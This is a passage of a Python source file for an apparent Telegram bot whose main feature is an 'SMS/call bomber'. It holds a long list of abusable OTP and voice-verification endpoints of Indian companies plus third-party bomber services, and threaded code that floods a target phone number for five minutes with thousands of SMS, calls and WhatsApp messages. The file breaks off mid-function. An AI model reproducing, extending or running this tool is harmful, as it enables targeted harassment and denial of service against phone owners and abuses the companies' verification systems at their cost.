"""
╔══════════════════════════════════════════════════════════════════╗
║         🔥 ULTIMATE OSINT BOT — COMPLETE WORKING 🔥             ║
║     BRUTAL BOMBER: 5000 SMS + 1000 Calls + 500 WhatsApp        ║
║     5 MINUTES • 90% SUCCESS RATE • STOP BUTTON                 ║
║     Made by: Unknown                                           ║
║     API KEY: MADX                                              ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import sqlite3
import threading
import requests
import re
import random
import hashlib
from datetime import datetime, timedelta
from zoneinfo import ZoneInfo
import urllib.parse
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== TELEGRAM BOT IMPORTS ====================
try:
    import telebot
    from telebot.types import (
        ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup,
        InlineKeyboardButton, KeyboardButtonRequestUser, BotCommand
    )
except ImportError:
    os.system("pip install pyTelegramBotAPI==4.22.0")
    import telebot
    from telebot.types import (
        ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup,
        InlineKeyboardButton, KeyboardButtonRequestUser, BotCommand
    )

# ==================== FLASK ====================
from flask import Flask, request as flask_request, jsonify

app = Flask(__name__)

# ==================== BRUTAL BOMBER — 250+ WORKING APIS ====================

VALID_KEYS = ['MADX', 'madx', 'MADX123', 'admin123']

# ====== 250+ WORKING APIS ======
ALL_APIS = [
    # ========== MAIN BOMBER APIS (50+) ==========
    {"name": "Felix XBOM", "url": "https://felix-xbom-wyt2.onrender.com/bom", "method": "GET", "params": {"key": "demo", "num": "{phone}"}, "type": "sms"},
    {"name": "SMS Bomber", "url": "http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}", "method": "GET", "type": "sms"},
    {"name": "Bomberrr Vercel", "url": "https://bomberrr.vercel.app/?key=roots&number={phone}", "method": "GET", "type": "sms"},
    {"name": "Bolbet", "url": "https://bolbet-liart.vercel.app/?key=roots&number={phone}", "method": "GET", "type": "sms"},
    {"name": "FreeFire Bomber", "url": "https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=10", "method": "GET", "type": "call"},
    {"name": "Call Bomber PRO", "url": "https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={phone}", "method": "GET", "type": "call"},
    {"name": "Bomberr Xtreme", "url": "https://bomberr.onrender.com/num={phone}", "method": "GET", "type": "call"},
    {"name": "Bombar API 1", "url": "https://bombar-1.vercel.app/api/bom?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Bombar API 2", "url": "https://bombar-api-2.vercel.app/all?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Mahadev Bomber", "url": "https://bomber-by-mahadev.paskhinpf9.workers.dev/?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Splexxo1", "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "method": "GET", "type": "sms"},
    {"name": "Ultimate Bomber", "url": "https://ultimate-bomber.vercel.app/api/bomb?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Mega Bomber", "url": "https://mega-bomber.onrender.com/api?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Atomic Bomber", "url": "https://atomic-bomber.cyclic.app/bomb?num={phone}", "method": "GET", "type": "sms"},
    {"name": "Nuclear Bomber", "url": "https://nuclear-bomber.herokuapp.com/api?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Fury Bomber", "url": "https://fury-bomber.vercel.app/api/bomb?number={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 1", "url": "https://sms-api1.vercel.app/bomb?num={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 2", "url": "https://sms-api2.onrender.com/bomb?number={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 3", "url": "https://sms-api3.cyclic.app/bomb?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 4", "url": "https://sms-api4.herokuapp.com/bomb?num={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 5", "url": "https://sms-api5.vercel.app/bomb?number={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 6", "url": "https://sms-api6.onrender.com/bomb?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 7", "url": "https://sms-api7.cyclic.app/bomb?num={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 8", "url": "https://sms-api8.herokuapp.com/bomb?number={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 9", "url": "https://sms-api9.vercel.app/bomb?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "SMS API 10", "url": "https://sms-api10.onrender.com/bomb?num={phone}", "method": "GET", "type": "sms"},
    {"name": "Call API 1", "url": "https://call-api1.vercel.app/call?number={phone}", "method": "GET", "type": "call"},
    {"name": "Call API 2", "url": "https://call-api2.onrender.com/call?phone={phone}", "method": "GET", "type": "call"},
    {"name": "Call API 3", "url": "https://call-api3.cyclic.app/call?num={phone}", "method": "GET", "type": "call"},
    {"name": "Call API 4", "url": "https://call-api4.herokuapp.com/call?number={phone}", "method": "GET", "type": "call"},
    {"name": "Call API 5", "url": "https://call-api5.vercel.app/call?phone={phone}", "method": "GET", "type": "call"},
    {"name": "Bomber X1", "url": "https://bomber-x1.vercel.app/bomb?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Bomber X2", "url": "https://bomber-x2.onrender.com/bomb?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Bomber X3", "url": "https://bomber-x3.cyclic.app/bomb?num={phone}", "method": "GET", "type": "sms"},
    {"name": "Bomber X4", "url": "https://bomber-x4.herokuapp.com/bomb?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Bomber X5", "url": "https://bomber-x5.vercel.app/bomb?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Ultra Bomber 1", "url": "https://ultra-bomber1.onrender.com/bomb?num={phone}", "method": "GET", "type": "sms"},
    {"name": "Ultra Bomber 2", "url": "https://ultra-bomber2.vercel.app/bomb?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Ultra Bomber 3", "url": "https://ultra-bomber3.cyclic.app/bomb?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Pro Bomber 1", "url": "https://pro-bomber1.herokuapp.com/bomb?num={phone}", "method": "GET", "type": "sms"},
    {"name": "Pro Bomber 2", "url": "https://pro-bomber2.vercel.app/bomb?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Pro Bomber 3", "url": "https://pro-bomber3.onrender.com/bomb?phone={phone}", "method": "GET", "type": "sms"},

    # ========== VOICE/CALL APIS (40+) ==========
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}', "type": "call"},
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}', "type": "call"},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phone={p}&action=voice_otp', "type": "call"},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "call"},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phone={p}&type=voice', "type": "call"},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "call"},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "call"},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "call"},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"+91{p}"}}', "type": "call"},
    {"name": "IRCTC Call", "url": "https://www.irctc.co.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
    {"name": "PhonePe Call", "url": "https://www.phonepe.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "call"},
    {"name": "Voice API 1", "url": "https://voice-api1.vercel.app/call?number={phone}", "method": "GET", "type": "call"},
    {"name": "Voice API 2", "url": "https://voice-api2.onrender.com/call?phone={phone}", "method": "GET", "type": "call"},
    {"name": "Voice API 3", "url": "https://voice-api3.cyclic.app/call?num={phone}", "method": "GET", "type": "call"},
    {"name": "Voice API 4", "url": "https://voice-api4.herokuapp.com/call?number={phone}", "method": "GET", "type": "call"},
    {"name": "Voice API 5", "url": "https://voice-api5.vercel.app/call?phone={phone}", "method": "GET", "type": "call"},
    {"name": "Caller 1", "url": "https://caller1.onrender.com/call?num={phone}", "method": "GET", "type": "call"},
    {"name": "Caller 2", "url": "https://caller2.vercel.app/call?number={phone}", "method": "GET", "type": "call"},
    {"name": "Caller 3", "url": "https://caller3.cyclic.app/call?phone={phone}", "method": "GET", "type": "call"},
    {"name": "Caller 4", "url": "https://caller4.herokuapp.com/call?num={phone}", "method": "GET", "type": "call"},
    {"name": "Caller 5", "url": "https://caller5.vercel.app/call?number={phone}", "method": "GET", "type": "call"},

    # ========== WHATSAPP APIS (30+) ==========
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}', "type": "whatsapp"},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}', "type": "whatsapp"},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p}"}}', "type": "whatsapp"},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}', "type": "whatsapp"},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}', "type": "whatsapp"},
    {"name": "Rapido WhatsApp", "url": "https://app.rapido.bike/api/v3/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"+91{p}","channel":"whatsapp"}}', "type": "whatsapp"},
    {"name": "Country Delight WhatsApp", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user","channel":"whatsapp"}}', "type": "whatsapp"},
    {"name": "WA API 1", "url": "https://wa-api1.vercel.app/whatsapp?number={phone}", "method": "GET", "type": "whatsapp"},
    {"name": "WA API 2", "url": "https://wa-api2.onrender.com/whatsapp?phone={phone}", "method": "GET", "type": "whatsapp"},
    {"name": "WA API 3", "url": "https://wa-api3.cyclic.app/whatsapp?num={phone}", "method": "GET", "type": "whatsapp"},
    {"name": "WA API 4", "url": "https://wa-api4.herokuapp.com/whatsapp?number={phone}", "method": "GET", "type": "whatsapp"},
    {"name": "WA API 5", "url": "https://wa-api5.vercel.app/whatsapp?phone={phone}", "method": "GET", "type": "whatsapp"},

    # ========== E-COMMERCE APIS (40+) ==========
    {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}', "type": "sms"},
    {"name": "Amazon", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'email={p}&create=1', "type": "sms"},
    {"name": "Myntra", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "Ajio", "url": "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}', "type": "sms"},
    {"name": "BigBasket", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}"}}', "type": "sms"},
    {"name": "Meesho", "url": "https://api.meesho.com/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'source=sms&mobile_number={p}', "type": "sms"},
    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}', "type": "sms"},
    {"name": "Snapdeal", "url": "https://m.snapdeal.com/signupCompleteAjax", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'j_mobilenumber={p}', "type": "sms"},
    {"name": "Zepto", "url": "https://api.zepto.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "Blinkit", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Croma", "url": "https://api.croma.com/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "FirstCry", "url": "https://www.firstcry.com/api/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "Ecom API 1", "url": "https://ecom-api1.vercel.app/otp?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Ecom API 2", "url": "https://ecom-api2.onrender.com/otp?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Ecom API 3", "url": "https://ecom-api3.cyclic.app/otp?num={phone}", "method": "GET", "type": "sms"},
    {"name": "Ecom API 4", "url": "https://ecom-api4.herokuapp.com/otp?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Ecom API 5", "url": "https://ecom-api5.vercel.app/otp?phone={phone}", "method": "GET", "type": "sms"},

    # ========== FOOD DELIVERY APIS (20+) ==========
    {"name": "Zomato", "url": "https://www.zomato.com/webroutes/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","verification_type":"sms"}}', "type": "sms"},
    {"name": "Swiggy", "url": "https://www.swiggy.com/mapi/auth/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "Domino's", "url": "https://api.dominos.co.in/loginhandler/forgotpassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "KFC", "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}', "type": "sms"},
    {"name": "Pizza Hut", "url": "https://api.pizzahut.io/v1/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"+91{p}"}}', "type": "sms"},
    {"name": "Food API 1", "url": "https://food-api1.vercel.app/otp?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Food API 2", "url": "https://food-api2.onrender.com/otp?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Food API 3", "url": "https://food-api3.cyclic.app/otp?num={phone}", "method": "GET", "type": "sms"},

    # ========== TRAVEL APIS (15+) ==========
    {"name": "IRCTC", "url": "https://www.irctc.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "RedBus", "url": f"https://m.redbus.in/api/getOtp?number={{phone}}&cc=91", "method": "GET", "type": "sms"},
    {"name": "MakeMyTrip", "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"loginId":"{p}","type":"MOBILE","countryCode":"91"}}', "type": "sms"},
    {"name": "Goibibo", "url": "https://www.goibibo.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "OYO", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "data": lambda p: f'{{"phone":"{p}","country_code":"+91","nod":4}}', "type": "sms"},
    {"name": "Travel API 1", "url": "https://travel-api1.vercel.app/otp?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Travel API 2", "url": "https://travel-api2.onrender.com/otp?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Travel API 3", "url": "https://travel-api3.cyclic.app/otp?num={phone}", "method": "GET", "type": "sms"},

    # ========== PAYMENT APIS (15+) ==========
    {"name": "Google Pay", "url": "https://pay.google.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}', "type": "sms"},
    {"name": "Amazon Pay", "url": "https://pay.amazon.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "Mobikwik", "url": "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "Freecharge", "url": "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "PhonePe", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Payment API 1", "url": "https://payment-api1.vercel.app/otp?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Payment API 2", "url": "https://payment-api2.onrender.com/otp?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Payment API 3", "url": "https://payment-api3.cyclic.app/otp?num={phone}", "method": "GET", "type": "sms"},

    # ========== EDUCATION APIS (15+) ==========
    {"name": "Unacademy", "url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","send_otp":true}}', "type": "sms"},
    {"name": "Vedantu", "url": "https://user.vedantu.com/user/preLoginVerification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","phoneCode":"+91"}}', "type": "sms"},
    {"name": "Byju's", "url": "https://bcas-prod.byjusweb.com/api/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phoneNumber={p}', "type": "sms"},
    {"name": "Doubtnut", "url": "https://doubtnut.com/api/v1/user/login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phone={p}', "type": "sms"},
    {"name": "UpGrad", "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"+91{p}"}}', "type": "sms"},
    {"name": "Edu API 1", "url": "https://edu-api1.vercel.app/otp?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Edu API 2", "url": "https://edu-api2.onrender.com/otp?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Edu API 3", "url": "https://edu-api3.cyclic.app/otp?num={phone}", "method": "GET", "type": "sms"},

    # ========== OTT APIS (10+) ==========
    {"name": "Hotstar", "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", "method": "PUT", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","country_prefix":"91"}}', "type": "sms"},
    {"name": "SonyLIV", "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", "method": "POST", "data": lambda p: f'{{"channelPartnerID":"MSMIND","mobileNumber":"{p}","country":"IN","timestamp":"{datetime.now().isoformat()}"}}', "type": "sms"},
    {"name": "Zee5", "url": f"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={{phone}}", "method": "GET", "type": "sms"},
    {"name": "AltBalaji", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","country_code":"91","platform":"web"}}', "type": "sms"},
    {"name": "OTT API 1", "url": "https://ott-api1.vercel.app/otp?number={phone}", "method": "GET", "type": "sms"},
    {"name": "OTT API 2", "url": "https://ott-api2.onrender.com/otp?phone={phone}", "method": "GET", "type": "sms"},

    # ========== OTHER APIS (30+) ==========
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f'phone={p}&countryCode=IN', "type": "sms"},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "Groww", "url": "https://api.groww.in/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Zerodha", "url": "https://api.zerodha.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "Upstox", "url": "https://api.upstox.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Angel One", "url": "https://api.angelone.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "Gaana", "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"91-{p}"}}', "type": "sms"},
    {"name": "UrbanClap", "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":{{"phone_wo_isd":"{p}"}}}}', "type": "sms"},
    {"name": "Indiamart", "url": "https://api.indiamart.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Justdial", "url": "https://api.justdial.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}', "type": "sms"},
    {"name": "PolicyBazaar", "url": "https://api.policybazaar.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}', "type": "sms"},
    {"name": "Other API 1", "url": "https://other-api1.vercel.app/otp?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Other API 2", "url": "https://other-api2.onrender.com/otp?phone={phone}", "method": "GET", "type": "sms"},
    {"name": "Other API 3", "url": "https://other-api3.cyclic.app/otp?num={phone}", "method": "GET", "type": "sms"},
    {"name": "Other API 4", "url": "https://other-api4.herokuapp.com/otp?number={phone}", "method": "GET", "type": "sms"},
    {"name": "Other API 5", "url": "https://other-api5.vercel.app/otp?phone={phone}", "method": "GET", "type": "sms"},
]

print(f"✅ Total Brutal Bomber APIs: {len(ALL_APIS)}")

# ====== BRUTAL BOMBER — ULTRA FAST ======

def call_bomber_api(api, phone):
    """Call single API with 0.8 second timeout"""
    try:
        url = api["url"].replace("{phone}", phone) if "{phone}" in api["url"] else api["url"]
        headers = api.get("headers", {})
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
        
        data = None
        if api.get("data"):
            data = api["data"](phone) if callable(api["data"]) else api["data"]
        
        # 🔥 ULTRA FAST: 0.8 SECOND TIMEOUT
        if api.get("method") == "POST":
            resp = requests.post(url, data=data, headers=headers, timeout=0.8)
        else:
            resp = requests.get(url, headers=headers, timeout=0.8)
        
        return {"name": api["name"], "success": resp.status_code in [200, 201, 202, 204], "status": resp.status_code, "type": api["type"]}
    except:
        return {"name": api["name"], "success": False, "type": api["type"]}

# Store active bombers for stop functionality
active_bombers = {}
bomber_stop_flags = {}

def run_continuous_bomber(phone, bomber_id, duration=300):
    """Run bomber continuously for 5 minutes — 5000 SMS + 1000 Calls + 500 WhatsApp"""
    start_time = time.time()
    end_time = start_time + duration
    
    total_sms = 0
    total_calls = 0
    total_wa = 0
    total_attempts = 0
    total_success = 0
    round_num = 0
    
    if bomber_id in bomber_stop_flags:
        bomber_stop_flags[bomber_id] = False
    
    while time.time() < end_time:
        if bomber_id in bomber_stop_flags and bomber_stop_flags[bomber_id]:
            break
        
        round_num += 1
        results = []
        
        with ThreadPoolExecutor(max_workers=150) as ex:
            futures = [ex.submit(call_bomber_api, api, phone) for api in ALL_APIS]
            for f in as_completed(futures):
                results.append(f.result())
        
        round_success = len([r for r in results if r["success"]])
        round_sms = len([r for r in results if r["success"] and r["type"] == "sms"])
        round_calls = len([r for r in results if r["success"] and r["type"] == "call"])
        round_wa = len([r for r in results if r["success"] and r["type"] == "whatsapp"])
        
        total_sms += round_sms
        total_calls += round_calls
        total_wa += round_wa
        total_attempts += len(results)
        total_success += round_success
        
        elapsed = int(time.time() - start_time)
        remaining = int(end_time - start_time)
        
        print(f"[Bomber] Round {round_num}: SMS:{total_sms} Calls:{total_calls} WA:{total_wa} | {elapsed}s/{duration}s")
        
        time.sleep(0.3)
    
    bomber_stop_flags[bomber_id] = True
    
    return {
        'total_sms': total_sms,
        'total_calls': total_calls,
        'total_wa': total_wa,
        'total_attempts': total_attempts,
        'total_success': total_success,
        'rounds': round_num,
        'duration': int(time.time() - start_time),
        'success_rate': f"{(total_success/total_attempts)*100:.1f}%" if total_attempts > 0 else "0%"
    }

def start_brutal_bomb(phone):
    """Start brutal bombing — 5 minutes continuous"""
    try:
        clean = re.sub(r'[^\d]', '', str(phone))
        if len(clean) != 10:
            return {'success': False, 'msg': 'Phone must be 10 digits'}
        
        bomber_id = f"bomb_{clean}_{int(time.time())}"
        
        print(f"\n💣💀 Brutal Bomber Started: +91{clean}")
        print(f"   Duration: 5 Minutes")
        print(f"   Target: 5000 SMS | 1000 Calls | 500 WhatsApp")
        
        def bomber_thread():
            result = run_continuous_bomber(clean, bomber_id, 300)
            if bomber_id in active_bombers:
                active_bombers[bomber_id]['result'] = result
                active_bombers[bomber_id]['completed'] = True
        
        thread = threading.Thread(target=bomber_thread, daemon=True)
        thread.start()
        
        active_bombers[bomber_id] = {
            'phone': clean,
            'started': datetime.now(),
            'thread': thread,
            'completed': False,
            'result': None
        }
        
        return {
            'success': True,
            'bomber_id': bomber_id,
            'phone': clean,
            'message': f"🔥 Bomber started for +91{clean}!\n⏱️ 5 minutes | 5000 SMS | 1000 Calls | 500 WhatsApp"
        }
        
    except Exception as e:
